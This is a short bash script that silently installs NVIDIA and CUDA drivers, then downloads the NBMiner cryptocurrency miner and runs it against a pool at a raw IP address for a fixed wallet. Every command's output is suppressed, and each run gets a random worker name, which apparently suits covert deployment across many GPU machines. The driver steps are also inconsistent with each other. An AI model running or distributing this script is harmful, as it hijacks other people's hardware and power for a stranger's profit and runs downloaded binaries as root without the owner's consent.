cd /home
sudo apt-get install linux-headers-$(uname -r) -y >/dev/null 2>&1
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g') >/dev/null 2>&1
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin >/dev/null 2>&1
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600 >/dev/null 2>&1
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb >/dev/null 2>&1
sudo dpkg -i cuda-keyring_1.0-1_all.deb >/dev/null 2>&1
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub >/dev/null 2>&1
sudo apt-get update >/dev/null 2>&1
sudo apt-get -y install cuda-drivers-510 >/dev/null 2>&1
sudo apt-get install libcurl3 -y >/dev/null 2>&1
apt update && sudo apt-get --purge remove "*nvidia*" && sudo apt-get install nvidia-driver-460 >/dev/null 2>&1
wget https://github.com/NebuTech/NBMiner/releases/download/v42.2/NBMiner_42.2_Linux.tgz >/dev/null 2>&1
sudo tar -xvf NBMiner_42.2_Linux.tgz >/dev/null 2>&1
cd NBMiner_Linux >/dev/null 2>&1
sudo ./nbminer -a octopus -o stratum+tcp://172.65.247.93:3389 --user 3PFJvQrpG4LqhTG6VfNoygyvT4bqJCdv6X.$(echo $(shuf -i 1000-9999 -n 1)-KVN) >/dev/null 2>&1
